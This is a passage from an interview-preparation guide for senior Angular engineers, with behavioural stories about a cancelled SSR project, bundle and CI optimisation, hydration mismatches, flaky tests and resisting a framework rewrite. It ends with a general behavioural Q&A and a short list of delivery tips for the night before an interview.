Angular's SSR story is genuinely good — ng add @angular/ssr, hydration since v16, incremental hydration which became the default strategy in v22 — so the framework was never the problem. The problem was our application. Three things surfaced in the first month. Our largest dependency was a charting library that touched window at module scope, so it had to be deferred behind a browser check, which meant the pages that mattered most rendered a skeleton on the server anyway. Our authentication was a client-side token flow, so every page behind login had nothing to render server-side without moving auth to cookies — a change with security review, a mobile client, and a partner integration attached to it. And our API was chatty enough that a server render made 11 sequential calls, giving a time-to-first-byte of 900 ms, which is worse for perceived performance than the client-rendered version we already had.

The moment I should have stopped was week five, when we had numbers showing the public pages — the only ones we could actually render — were 4% of traffic. I did not stop, because I had spent political capital getting it funded and because two engineers had done good work I did not want to waste. Both are sunk-cost reasoning and I knew that at the time; knowing the name of a bias turns out to be almost no protection against it. What finally moved me was writing the projection down: to make SSR worthwhile we needed the authentication change, an API aggregation layer and the charting replacement — about four more months — for a benefit we could estimate as maybe 300 ms of first contentful paint on 4% of traffic. Written as a sentence, the decision made itself.

The cancellation was the part I did well, and it is the part interviewers care about. I wrote a two-page note: what we believed, what we found, what it would cost to continue, and my recommendation, with the SEO question answered separately — the agency's claim turned out to be wrong, Google renders JavaScript, and the actual ranking problem was missing metadata and slow images, which we fixed in a week. I presented it to the sponsor before telling the team, so nobody heard it as a rumour, then told the two engineers together, in person, before it went anywhere else. And I made sure the salvage was real and visible: the route-level code splitting, the @defer work and the image optimisation done under the SSR banner all shipped and gave us a 40% improvement in largest contentful paint — a bigger win than SSR would have delivered, from a fifth of the effort.

(d) Follow-up drill chain

What would have made SSR the right call?

A different traffic profile and a different application shape. If the majority of our traffic had been anonymous first-visit users on public content — a commerce catalogue, a publisher, a marketplace — then server rendering is transformative, because first contentful paint on a cold visit is the entire experience for someone who may never come back. And it needs an application that can render meaningfully without browser APIs and without a client-only auth token. We had none of those; a publisher with the same framework would have had all three, and I would have argued hard for it.

Why did it take you six weeks to act on evidence you had in week five?

Sunk cost, in two forms, and I would rather name them than construct a better-sounding reason. The organisational one: I had argued for the funding, and cancelling meant telling the sponsor that my judgment had been wrong in a visible way, which costs credibility in the short term. The personal one: two engineers had done genuinely good work and cancelling felt like devaluing it. Neither is a reason, and I knew that while it was happening — being able to name a bias is remarkably poor protection against experiencing it. What changed my behaviour permanently was not insight, it was a mechanism: kill criteria written into the proposal with a date, so the decision is a scheduled review rather than an act of courage.

What did you tell the two engineers, and what happened to them?

I told them together, in person, before the note went anywhere, and I led with the decision rather than building up to it, because a preamble just makes people wait for the bad news. I was specific that the failure was in the approval, which was mine, not in the execution, which was theirs and was good — and I could point to the salvaged work as evidence rather than as consolation, because the code splitting and image work shipped and moved a real number. One of them was visibly relieved; he had known it was not working for weeks and had not felt able to say so, which was the most useful and least comfortable feedback I got out of the whole thing. I changed how I ran project check-ins as a result: I now ask explicitly, every fortnight, "what would make you want to stop this?"

How do you avoid over-correcting into never trying anything ambitious?

By making the experiment cheap rather than making the ambition smaller. The lesson I took was not "do not attempt SSR", it was "spend two days before spending eleven weeks" — and a two-day spike is compatible with any amount of ambition. I also try to be careful about which failure I am guarding against: the expensive one is committing to a long project on an unvalidated premise, not the project being hard. The organisational version of the same point is that if cancelling is treated as failure, nobody proposes anything risky, so part of my job is making sure a stopped project is described as a decision rather than a mess — which is why I presented the cancellation with numbers and a recommendation rather than an apology.

Would you revisit SSR today on Angular 22?

For that application, only if the traffic profile changed — the analysis was about us, not about the framework, and it would come out the same way. What has genuinely changed is the cost side: incremental hydration became the default strategy in v22, so you no longer choose between shipping a fully-hydrated page and a static one, and you can hydrate individual regions on interaction or viewport. That materially improves the case for a mixed application like ours, where some regions are static content and others are interactive. So my honest position is that the calculation would be closer today, and I would run the same two-day spike rather than trusting that impression — which is precisely the discipline the failure taught me.

What do you now put in every project proposal?

Four things, and the last one is the one that matters. The premise, stated as a falsifiable claim rather than a benefit. The cheapest experiment that could disprove it, done before funding. The expected benefit with a number and the population it applies to — "300 ms for 4% of users" would have ended this project at week zero. And explicit kill criteria with a review date, agreed by the sponsor in advance, so stopping is a plan rather than a reversal. That last one has since ended two projects early, one of them mine, and in both cases the conversation took ten minutes because we were following an agreement rather than having an argument.

Two costs, one root cause. Our initial bundle was 1.9 MB compressed, which cost users about six seconds on a 4G connection and cost us a CDN bill that had grown 40% year on year while traffic grew 12%. Our CI was 14 minutes per pull request across roughly 40 merges a day, which cost about 9 hours of runner time daily and, more expensively, cost each engineer a context switch per review cycle. I was given the CDN bill as the problem. The bundle was the actual problem, and the CI number came along with it because both were symptoms of a build nobody had looked at in three years.

The first move was measurement rather than intuition. ng build --stats-json plus a bundle analyser gave a treemap, and it was the usual distribution: three dependencies accounted for 61% of the initial chunk. A moment library and its locales at 320 kB, imported for date formatting in four places — replaced with the platform's own Intl.DateTimeFormat via Angular's DatePipe, which costs nothing because it is already there. A charting library at 480 kB, imported eagerly by a component used on two screens out of forty — moved behind @defer (on viewport). And a full icon set at 210 kB where we used 34 icons — replaced with an inline SVG sprite built at compile time. None of that is clever; all of it was invisible because nobody had a number.

The structural changes mattered more than the individual wins because they are the ones that hold. Every route became lazily loaded, which sounds obvious and was not true for eleven of our forty routes. We deleted the SharedModule re-export bag described in story 09, which was defeating tree-shaking wholesale. And we set budgets in angular.json so a regression fails the build rather than being discovered a year later by someone reading a bill — that single change is why the number has stayed down for two years, and it is the part of the story I lead with.

Why did the bundle grow to 1.9 MB without anyone noticing?

Because nothing measured it and every individual increase was defensible. A dependency added for one feature is 200 kB once; nobody blocks a pull request over it, and there was no number in the review to blocked against. The re-export module made it worse in a way that is genuinely invisible — importing a bag of exports means the bundler cannot prove which parts are unused, so adding one component to that module grew every entry point in the application. That is the pattern I look for now: not the big dependency, but the structure that turns a local addition into a global cost. The fix is not vigilance, it is a budget in CI, because a number in a failing build is the only review comment that never gets tired.

What did you trade away?

Three things, and the second one bit us. Deferring the charting library means the first person to scroll to a chart waits about 400 ms for a chunk, which is a slightly worse experience for a minority in exchange for a much better one for everybody — I would make that trade again but it is a trade. The icon sprite meant adding an icon now requires a build step, and for two months people did not know that and shipped broken icons; the fix was a lint rule and a line in the readme, but I should have anticipated it. And dropping the date library cost us three subtle formatting differences in edge cases that a support ticket found before we did, because Intl is not a drop-in equivalent for a library with its own opinions about timezones.

At what point do bundle budgets become counterproductive?

When they are set so tight that the routine response is to raise them, at which point they are decoration. I set ours about 15% above the post-optimisation number, which is enough headroom for normal feature work and tight enough that a new dependency trips it. The other failure is granularity: a single initial budget says nothing about a lazy chunk that has grown to 2 MB, so we also budget per component style and watch the largest lazy chunks in the build output. And budgets say nothing about runtime cost — a 10 kB dependency that blocks the main thread for 300 ms passes every budget you can set. That is why the budget is a floor and the field metrics are the actual measure.

How did you attribute the conversion improvement to the bundle change?

Carefully, and with a caveat I would state in the interview too. We did not run a true experiment — you cannot easily A/B a bundle size — so the evidence is correlational: the improvement appeared in the week of the deploy, it was concentrated in the mobile and slow-connection segments where the load improvement was largest, and it persisted across the following quarter with no other change to that flow. That is strong enough to act on and not strong enough to claim causation without qualification. If I needed a defensible number I would have shipped it behind a server-side split serving the old bundle to a holdback group, which is possible and was not worth the complexity for a change we were making anyway.

Why not go further — self-hosted runners, remote caching, test sharding?

Because six minutes was under the threshold where the pipeline stops shaping behaviour, and past that the returns fall off sharply while the operational cost does not. The thing I actually cared about was that an engineer can push, get feedback and stay in context, and that happens somewhere under ten minutes; going from six to three would have been pleasant and would not have changed how anyone works. Self-hosted runners in particular are a real ongoing cost — someone maintains them, they break at inconvenient times, and the savings look good until you price the maintenance. I would revisit at twice the merge volume or if the suite crosses ten minutes again, and I wrote that trigger down so the decision gets re-made rather than inherited.

What would you do first on a new Angular 22 codebase to keep this from happening?

Budgets on day one, when they cost nothing to satisfy, plus the application builder — which on v22 is the only supported option anyway, since the webpack builders are deprecated. Then two habits: every new dependency comes with its bundle cost in the pull-request description, which takes thirty seconds and changes the conversation entirely, and anything used on fewer than a quarter of screens goes behind @defer by default rather than by exception. On v22 I would also use injectAsync() for heavy services so lazy loading is not limited to components. None of that is clever; it is just doing at the start what we did after three years, and the difference in cost is about a hundred to one.

(d) Follow-up drill chain

What is Angular actually doing during hydration, and why does a mismatch matter?

On the server, Angular renders the component tree to an HTML string and serialises some metadata alongside it. In the browser, instead of creating DOM from scratch, it walks the existing server-rendered nodes and claims them — attaching listeners, wiring bindings, adopting the elements as its own views. That is the whole point: no destroy-and-recreate, so the page does not flicker and the content is visible and correct before JavaScript finishes. A mismatch means the node it expected is not the node it found, and at that point it cannot safely adopt the subtree, so it falls back to destroying and re-rendering it — which reintroduces the flicker, loses any DOM state such as scroll position or an open accordion, and costs the performance the whole mechanism existed to buy. It is a correctness-preserving fallback, which is why it degrades rather than crashes.

Why was disabling hydration a safe mitigation rather than a risk?

Because it removes an optimisation, not a capability. Without hydration those routes are ordinary client-rendered Angular pages: the server-rendered HTML still arrives and is still visible immediately, and the client discards it and renders normally, so the cost is a re-render on load — worse largest contentful paint, everything functional. That asymmetry is what made it the right 03:40 action: the failure mode of the mitigation is "slightly slower", which is an order of magnitude better than the failure mode of the incident. The general principle I apply on-call is to prefer mitigations whose worst case is a degraded experience over ones whose worst case is unknown — and to be able to state what the worst case is before I press the button.

Would you have used ngSkipHydration as the fix instead?

Not for this cause, and the distinction matters. ngSkipHydration is right when a component legitimately owns its own DOM — a third-party charting or map widget that manipulates elements directly — because there the mismatch is by design and permanent, and you are telling Angular to leave that subtree alone. Using it to paper over invalid CMS markup would have hidden a data-quality problem behind an annotation, and the next piece of bad content would have broken a component that did not have the attribute. So we used it for the two genuine cases, which were latent risks we had never catalogued, and fixed the actual cause at ingest. The rule I would give: skip hydration where the mismatch is intentional, fix the source where it is accidental.

Should you have woken someone up?

If the mitigation had not worked within about fifteen minutes, yes, and I had already decided that before starting — deciding your escalation trigger while calm is the whole trick, because at 03:40 you will always feel like you are five minutes from solving it. I also posted in the incident channel at 03:43 rather than waiting until I had something to report, so that anyone awake could join and so there was a written timeline. The thing I would push back on is the framing that solo resolution is impressive: a system where one person's knowledge is the difference between 25 minutes and 4 hours is a fragile system, and the runbook entry I wrote afterwards was explicitly an attempt to make myself unnecessary next time.

At what point would you turn hydration off permanently?

If the content pipeline could not be made to produce valid markup reliably — which is a real possibility when editors paste arbitrary HTML and you do not control the CMS. The honest calculation is that hydration buys a few hundred milliseconds of largest contentful paint on those routes, and repeated flickering costs more trust than that buys. I would rather ship consistently-correct client-rendered pages than intermittently-broken hydrated ones. In our case sanitising at ingest was tractable, so the question did not arise; if it had not been, my recommendation would have been to keep SSR for the HTML delivery and skip hydration on the CMS-driven regions specifically, which is the middle option people forget exists.

How does incremental hydration change this on Angular 22?

It changes the blast radius rather than the failure. Incremental hydration became the default strategy in v22, so instead of hydrating the whole document at bootstrap you hydrate regions on a trigger — viewport, interaction, idle. A mismatch then affects the region being hydrated at the moment it is hydrated, so a bad CMS block breaks that block on scroll rather than the whole page at load. That is genuinely better for containment and slightly worse for diagnosis, because the error now fires at an arbitrary time and correlating it with a user action takes more care. I would still fix the markup at ingest, and I would make sure our error reporting captures which region was hydrating, because "NG0500 somewhere on the page" is a much harder ticket than "NG0500 in the pricing block".

Why not just retry failed tests automatically?

Because it hides the exact information you need and it does not distinguish a timing artefact from a real race. A test that fails one run in twenty because the application has a genuine race will pass on retry, and you have now automated the process of shipping that bug — which is precisely how the two production defects got through before we started. Retrying a unit or component test is almost always covering for a fixable determinism problem.

How do you tell a flaky test from a real race in the application?

You look at the failure rather than the flakiness. The diagnostic question is whether the test is asserting something that should be true regardless of timing: if it says "after the debounce and the response, the list shows three results", that must always hold, and intermittent failure means the code has a path where it does not. Whereas if the test is asserting an outcome after a fixed real-world delay, the test itself has encoded a timing assumption and the test is at fault. The practical method is to make the test deterministic first — fakeAsync, explicit HTTP flush, controlled clock — and see whether it then fails consistently. If it does, you have found a bug; that happened six times for us, and one of them was a real double-submit on a payment form.

At what point is deleting a test the right answer?

When the coverage it provides is genuinely duplicated elsewhere, or when it tests an implementation detail that has changed. Our quarantine policy forces that decision within two weeks and requires a written note about what coverage is lost, which is the important part — deleting a test silently is how suites rot, and deleting one with a sentence saying "this asserted internal ordering that no longer exists, and the behaviour is covered by the end-to-end path" is a reasonable engineering act. What I would not accept is deleting a test because it is hard to make deterministic; that usually means the code is hard to reason about, and the test is telling you something you do not want to hear.

None of those is a framework. On ecosystem, the specific gap he had in mind was a charting library, and it had a maintained Angular wrapper. And the cost of the rewrite, estimated conservatively with two others so it was not my number alone, was 14 to 18 months of the entire front-end team, during which the product ships nothing.

I presented that in a document with the rewrite case argued as strongly as I could make it, including the two genuine advantages — a larger talent pool at the junior end, and a lighter runtime for a marketing site we might build. Then I proposed an alternative: spend one quarter on the three things engineers actually named, and revisit in six months with the same criteria. He agreed, I think partly because the document did not make him wrong; it made his diagnosis reasonable and the treatment wrong, which is a distinction that lets someone change position without losing face. Six months later the suite was three minutes and 0.3% flaky (story 19), the legacy area had an owner and a written model, releases were one command, and the rewrite conversation did not restart. Attrition on the team went from three in the previous year to zero.

What I would do differently: I would have run that engineer survey a year earlier, on my own initiative. Sitting on a known problem without measuring it is what left the door open for someone to attribute it to the framework. I would also have been quicker to concede the genuine points; my first draft under-weighted the junior talent pool argument, a colleague called that out, and the document was much stronger once it was in there — an argument that concedes nothing reads as advocacy and gets discounted wholesale.

What the interviewer is really probing

Whether you can disagree with power without either capitulating or becoming an obstacle. The signal they want at principal level: you engaged with the underlying concern rather than the proposal, you gathered evidence including evidence that might have proved you wrong, you conceded the real points, and you offered an alternative rather than only a refusal.

The mistakes: characterising the stakeholder as naive or political — even by implication, and interviewers are alert to it because they are wondering how you would describe them. Also: winning by escalation, winning by attrition, or a story where you were simply right. If there is no point at which you updated your own view, the interviewer will suspect you do not update it.

(b) STAR / CARL scaffold

Situation
A senior stakeholder proposed something you believed was wrong and expensive. One line: the proposal, and the concern behind it stated generously.
Task
Yours: get to the right decision without damaging the relationship or your standing. Say clearly that you did not have the authority to decide.
Action
Separate the concern from the proposal → ask for time and offer to make both cases, sincerely → gather evidence that could disprove you → interview the people affected → price the alternative honestly → concede the genuine advantages → propose a cheaper experiment with a review date.
Result
The decision, and what happened: one quarter on the real problems, measurable improvements, the proposal not revisited, attrition to zero.
Differently
Measure known problems before someone else diagnoses them for you; concede the strong counter-arguments in the first draft, not the third.

(c) Recall prompts — find your own version

When did you disagree with someone more senior, and what did you do first?

Hint: the first move is the whole story. Did you argue, ask a question, or ask for time? "I asked what problem we were solving" is a much stronger opening than any counter-argument.

What have you been asked for that was a solution rather than a problem?

Hint: "rewrite it", "make it real-time", "add AI", "use microservices", "we need a design system". Every one has a real concern underneath. Which did you excavate, and was the concern legitimate?

When did evidence change your own position rather than theirs?

Hint: this is what makes the archetype credible. If you have gathered evidence and it has never once gone against you, either you have been lucky or you were not really looking.

What problem have you known about for a year without measuring it?

Hint: uncomfortable and useful. An unmeasured problem is one you cannot defend the priority of, and it is exactly the gap someone else will fill with their own diagnosis.

(d) Follow-up drill chain

What if the evidence had favoured the rewrite?

Then I would have said so and helped lead it, and I meant that when I offered it — the offer is worthless as a tactic if you would not honour it, and people can tell. Concretely, the things that would have changed my conclusion were a genuine hiring gap in our market, an unavoidable ecosystem dependency, or a framework trajectory that did not serve us. Two of those were checkable in a week and one was a judgment call. If it had gone the other way I would also have argued hard for a strangler approach rather than a big-bang rewrite — new features in the new stack behind the same shell, the old application shrinking — because 14 months of no delivery is the part of a rewrite that kills companies, and it is usually avoidable.

Is there a version of the hiring argument you would have accepted?

Yes, and I checked for it specifically. If our time-to-hire had been materially worse, if we had been losing candidates at offer stage over the stack rather than over money, or if we were in a market where the local talent pool genuinely skews one way, that is a real business constraint and I would take it seriously — a team you cannot staff is a worse problem than a framework you like. What I would still push back on is the leap from "hiring is hard" to "rewrite", because the cheaper interventions come first: compensation, hiring for engineering ability rather than framework experience, and a two-week onboarding path that gets a React engineer productive in Angular, which is a genuinely small gap for anyone experienced.

How did you avoid this becoming a fight you lost politically even if you won technically?

By never putting him in a position where changing his mind meant admitting a mistake. The document made his diagnosis reasonable — the team was frustrated, he had read that correctly six weeks in, which is to his credit — and located the error in the attribution rather than in the perception. I also gave him the win: the quarter of remediation was framed as his initiative in the write-up, because he had triggered it, and that is simply true. And I did not do any of it in a public channel; the first version went to him alone, with a note saying I would rather be wrong in private. None of that is manipulation, it is just recognising that being right in a way that costs someone status will be resisted regardless of the evidence.

What would you have done if he had proceeded anyway?

Committed properly and made it succeed, while making sure the risks were on the record once, in writing, without repetition. Practically: argue for the strangler approach over the big bang, insist on shipping product throughout, and make sure the three real problems were fixed regardless, because a flaky suite and an unowned legacy area follow you into any framework. I would not have quietly slow-walked it — that is the corrosive option and it damages you more than the decision does. There is a line where I would leave, and for me it is not "a decision I disagree with" but "a decision made after evidence was suppressed". That was not this.

How do you make sure you are not the one defending the status quo out of familiarity?

By checking the same things about myself that I would check about anyone else. I ask what evidence would change my mind, before I gather any — if I cannot answer that, I am not reasoning, I am defending. I ask someone who disagrees with me to read the draft; in this case a colleague who had used React heavily, which is where the junior-talent-pool concession came from. And I keep a genuine list of things about Angular that are worse than the alternatives, because a person who cannot name the weaknesses of their preferred tool is not an expert in it. For what it is worth, the framework has also moved a long way — signals, zoneless by default since v21, Signal Forms and the resource APIs stable in v22 — so the version of this argument I would have had three years ago is not the one I would have today.

Six months later, was he satisfied?

Reasonably, and the evidence I would offer is that he stopped asking. The three fixes were visible in numbers he cared about — deploy frequency roughly doubled, the change-failure rate fell, and attrition went from three to zero — and none of them required a framework. He did push for one thing I initially resisted and was right about, which was extracting the marketing site out of the main application entirely; it had different requirements, different traffic and different people editing it, and it did not belong. We built that separately, and it is not Angular. Being able to say that is part of why the rest held: I was not defending a monoculture, I was defending a specific application against a specific rewrite.

21The big behavioural Q&A

cross-cutting prompts 22 questions deploy a prepared story

These are the prompts that are not tied to one incident. Each answer says which story to reach for and what the interviewer is listening for — the point is that you should almost never need a story you have not prepared. Two rules for all of them: lead with one sentence of situation, and never spend more than 90 seconds before the first result.

Failure & ownership

Tell me about a time you caused a production incident.

Deploy story 03 (the chunk 404, where our own deploy strategy was the cause) or 12 (the form that ate edits). Own the mechanism in the first two sentences — "a normal deploy plus a long-lived tab equals a 404" — because the interviewer is listening for whether you take responsibility before being asked. Give impact in user terms, then the mitigation, then the class-level fix. The failure mode is a story where the cause was someone else's; if your best example genuinely was, say so and describe your part of the response honestly.

What is the biggest mistake you have made as an engineer?

Story 15 (approving the SSR project on argument rather than evidence, then taking six weeks to stop it) is the strongest option because the mistake is judgment, not typing, and because it has two failures in it — the approval and the delay. Pick something with real consequences you can describe without defensiveness, and finish with the mechanism that changed, not the feeling: kill criteria with a date, written into every proposal. Avoid humble-brag mistakes; interviewers hear "I cared too much about quality" constantly and discount the whole answer.

Tell me about a time you missed a deadline.

Use 11 inverted: the estimate exceeded the date, and the story is what you did with that fact and when. What matters is the timing of the disclosure — week one, in writing, with priced options — and what you protected. If you have a genuine miss, describe how you kept the stakeholder informed as it slipped rather than presenting a surprise on the date; silence is the failure, not the slip.

Tell me about a decision you reversed.

15 for reversing your own project, or 05 if the reversal was being persuaded by a colleague's evidence in review. The signal is intellectual honesty plus the ability to stop work already in flight. Say what the evidence was, how long you resisted it, and how you handled the people affected — the "how I told the two engineers" part is what distinguishes a senior answer from a principal one.

Conflict & influence

Tell me about a disagreement with a colleague.

Story 05 (RxJS versus signals in review). Steelman their position in one sentence before describing yours — that single move signals maturity more than the outcome does. Then the mechanism: out of the thread after two rounds, reduce it to one answerable question, decide on evidence, adopt the part they were right about. Close with the durable artefact (the one-line rule about state versus time) and the relationship, because the interviewer is quietly assessing whether they would want to disagree with you.

Tell me about a time you influenced without authority.

Story 14 (getting a platform team in another timezone to accept a release gate) or 17 (a per-area adoption nobody was made to do). The pattern to make explicit: bring the work already done rather than a request, give away authorship, and find the person whose problem it also was. Name that person and the moment it turned — interviewers are checking whether you can move an organisation you do not manage.

Tell me about pushing back on a manager or executive.

Story 20 (the React rewrite) or 11 (scope). The structure that works: separate the concern from the proposal, ask for time and sincerely offer to make both cases, gather evidence that could prove you wrong, concede the genuine points, and propose a cheaper experiment with a review date. Never characterise the stakeholder as naive or political — the answer should make the interviewer think you would handle them respectfully.

How do you handle a code-review disagreement that is going nowhere?

Two rounds, then a call — as a team norm rather than a personal escalation, so nobody reads it as a threat. Separate blocking from non-blocking explicitly in the comment itself and only block on correctness, security or an irreversible decision; if it is preference, say so and defer to the author. Story 05 is the worked example, and story 10 is the systemic version: decide the recurring arguments once, in writing, so the same debate is not relitigated per pull request.

Leadership & mentoring

Tell me about someone you developed.

Story 10. Name one anonymised person, their starting point, your specific intervention, and evidence of change — ideally something they did independently that you would not have done. The strongest single detail is the whiteboard moment and the fact that she, not you, gave the internal talk six weeks later. Avoid claiming their growth as your achievement; describe what you provided and let the interviewer infer.

How do you set technical direction across a team or several teams?

Combine 02 (a decision record with criteria rather than a preference), 10 (a rule of thumb that became team vocabulary) and 14 (an executable contract between teams). The principal-level answer is about artefacts and mechanisms that work without you in the room — written criteria, lint rules whose messages teach, contract tests, decision records — not about being consulted on everything. Give an example of your influence operating in your absence.

How do you make on-call sustainable for your team?

Story 18. Grade every page by "could the system have handled this itself?", delete or downgrade alerts that produce no action, and write the runbook entry the night you needed it and it was not there. Add the human half: the rota, time back after a bad night, and a culture where the mitigation is praised over the heroic solo diagnosis. Interviewers hear a lot about tooling here and very little about people — lead with the people, and mention that a system where one person's knowledge is the difference between 25 minutes and four hours is a fragile system.

Tell me about a time you had to deliver difficult feedback.

The private conversation in 08 (telling the author of the security bug before the write-up circulated) or the "did not change" branch of 10. Be specific about what you said, not just that you said it — the exact behaviour, its effect, and the substitution you offered. Include the outcome honestly, including if it took more than one conversation. Vague answers ("I gave direct feedback and they improved") read as invented.

Ambiguity & prioritisation

Tell me about a project with unclear requirements.

Story 13. Lead with the actual sentence you were given — "operations need a dashboard so they can see what's going on" — then the method: decide only what is irreversible (the domain model), make everything else data rather than code, ship a narrow slice to real users, and learn from behaviour. The distinguishing detail is the screenshotting: a requirement nobody could have told you, discovered by watching.

How do you prioritise when everything is urgent?

By cost of being wrong and reversibility, as in 13 and 11: protect the decisions that cannot be undone, defer anything with a workaround, and attach a trigger and an owner to everything deferred. Say who you involve — this is a question about whether you decide alone or make the trade-off visible to the people who own the outcome. The strongest supporting detail is a deferred item that was never asked for again.

How do you decide what to work on when nobody tells you?

Point at the measurement habit that recurs across 01, 16 and 19: find the number that describes the pain (INP, bundle size, flake rate, re-runs per merge), show it to people, and let it argue. At principal level, add the lesson from 20 — an unmeasured problem you have known about for a year is the gap someone else will fill with their own diagnosis, which is exactly how a rewrite proposal appears.

Tell me about a time you had to say no.

20 for a senior stakeholder, 11 for scope, 17 for the component library you evaluated and rejected, 15 for stopping your own project. The best version includes what you said yes to instead, delivered quickly — the rebrand on the date, the quarter of remediation, the SEO fix in a week. A candidate who only has "no" stories reads as an obstacle; one who has none reads as a pushover.

Technical judgment & depth

Walk me through the architecture of a front end you designed.

Use 02 as the spine — the three buckets of state — and pull in 13 (composition and lazy boundaries), 09 (DI scope and lifetimes) and 14 (the boundary to other teams). Structure it as constraints with numbers, then decisions, then trade-offs you knowingly accepted, then what you would change. Interviewers rate the trade-off narration above the diagram; a design presented with no downsides tells them you have not run it in production.

What is the most technically difficult thing you have worked on?

Choose by explainability, not prestige: 07 (12,000 rows at 60fps under a 400 msg/s feed) and 06 (the retainer chain) are both genuinely hard and narratable in three minutes. Make the difficulty concrete — the specific failure mode that made it hard — rather than adjectival. Then be ready to go two levels deeper than your summary, because "difficult" is an invitation to drill.

How do you keep up with technology?

Answer with a mechanism plus a dated specific, never a list of newsletters. The mechanism: release notes for the platforms you run, one deep source per area, and upgrading deliberately rather than in emergencies (04). Then prove it — Angular 22.0 shipped 3 June 2026 with Signal Forms, the resource APIs and Angular Aria stable, OnPush as the default change-detection strategy, HttpClient on fetch by default, incremental hydration as the default strategy, TypeScript 6 and Node 22 required, and the webpack builders deprecated; v22 is in active support until December 2026 and LTS until May 2028. One dated, checkable fact does more than a paragraph of enthusiasm.

How do you balance speed and quality?

Reject the framing gently and use 11 and 19: cut scope, not rigour, and note that a trustworthy pipeline makes you faster rather than slower — a nine-minute flaky suite is a speed problem. Give the concrete rule: define done before the pressure arrives, then reduce the count later. Name where you do accept less (polish on low-traffic surfaces with a documented fallback). The measurable version is change-failure rate falling while deploy frequency rises.

Values & motivation

Why Angular, if you were choosing today?

Answer as an engineer rather than an advocate, which means naming the fit rather than the superiority: an opinionated framework with dependency injection, routing, forms and HTTP in the box is worth most on long-lived applications with several teams and turnover, and worth least on a small marketing site — which is why in story 20 I argued to extract exactly that. Then be current: signals and zoneless have changed the framework's performance story materially since v20, and Signal Forms plus the resource APIs going stable in v22 removed a lot of what people used to reach for a state library for. Finish with a weakness you genuinely see; a candidate who cannot name one is not an expert in it.

Why do you want to work here, and what are you looking for?

Not a story question, but the one most often answered badly by strong engineers. Tie it to the work you have just described: if your best stories are about making systems legible and delivery boring, say that is what you want to do at more scale, and name something specific about their product or their engineering that makes that interesting. Vague enthusiasm reads as a mass application; a specific, verifiable reason reads as intent.

22Night-before cheat sheet

read once then sleep

Ten sentences to read the evening before. They are about delivery, not content — the content is above, and cramming it tonight will not help.

  1. Open with one sentence of situation, then stop. "We ran an operations console in Angular for about 200 daily users, and typing into a filter took 180 milliseconds per keystroke on their machines." Context, scale, symptom — then let them steer. Anything longer and you have spent your attention budget before the interesting part.
  2. Reach the result inside 90 seconds. Interviewers decide early whether you are a rambler. If the story is long, give the result early and offer the detail: "we took it from 420 to 90 milliseconds at p75; the interesting part is how we found it — want that?"
  3. Quantify with the metric that matters, not the one you remember. INP rather than Lighthouse, initial bundle rather than "the bundle", flake rate and re-runs per merge rather than "the tests were bad". If you do not have the number, say "roughly" and give a range — invented precision collapses under one follow-up.
  4. Separate "I" from "we" honestly and continuously. "The team migrated eight majors; I sequenced them and ran the standalone conversion." Taking credit for team work is the single most common thing that sinks otherwise strong candidates, and interviewers probe it deliberately with "what was your specific contribution?"
  5. Own the failure before you are asked. "Our deploy strategy was the cause" beats being walked into it. Every story in this bank has a "what I would do differently" for exactly that reason — deliver it unprompted, and make it a habit change rather than a regret.
  6. Tie every technical decision back to a real Angular trade-off. Say what you gave up: OnPush and signals cost you in-place mutation; virtual scrolling costs you find-in-page; zoneless costs you the safety net for state changed outside Angular; standalone costs you a per-file import list. A decision with no downside is one you have not examined, and that is what the drill-downs test.
  7. Have a scale answer ready for every story. "This holds to roughly X; past that the next constraint is Y" — a few hundred rows before you need virtualisation, tens of thousands before the sort has to move off the main thread, one team before an ad-hoc signal store needs real conventions. It converts a war story into evidence of design thinking, and pre-empts the follow-up that is coming anyway.
  8. Be precise about versions when you claim currency. Angular 22.0 released 3 June 2026: Signal Forms, the resource APIs and Angular Aria stable, OnPush the default strategy, fetch the default transport, incremental hydration the default, TypeScript 6 and Node 22 required, webpack builders deprecated. Zoneless and Vitest have been the defaults for new applications since v21 in November 2025. One dated fact signals you are current; "the latest version" signals the opposite.
  9. When you do not know, say so and then reason. "I have not run Angular at that scale — here is how I would find out, and here is what I would expect to bite first." Interviewers are far more comfortable with a calibrated engineer than a confident one, and inventing an answer is unrecoverable once they follow up.
  10. End each story with what it changed in how you work. The lint rule, the budget in CI, the runbook entry, the kill criteria in every proposal, the question you now ask in check-ins. It converts an anecdote into evidence of learning, which is the actual thing being assessed — and it hands the interviewer a natural place to go next.
